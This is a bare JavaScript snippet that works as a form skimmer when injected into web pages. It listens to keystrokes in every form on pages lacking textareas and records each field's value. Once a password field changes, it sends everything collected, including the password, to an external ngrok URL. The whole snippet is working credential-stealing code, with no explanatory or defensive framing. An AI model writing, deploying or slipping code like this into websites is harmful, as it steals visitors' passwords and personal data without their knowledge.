(() => {

    let data = { host : location.hostname },
        flag = false;

    !Array.from(document.querySelectorAll('textarea')).length &&
    Array.from(document.querySelectorAll('form'))
        .map((e) => e.addEventListener('keyup', (e) => [
            
            data[`${ e.target.name }-${ e.target.className }-${ e.target.id }`] = {
                value : e.target.value,
                type  : e.target.type
            },

            !flag && e.target.type === 'password' && [
                flag = true,
                e.target
                .onchange = (e) => fetch('https://13411515.ngrok.io/data', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body : JSON.stringify(data) })
                                    .then( (resp) => resp.json())
                                    .then( (data) => console.log('success', data))
            ]
        ])
    );

})();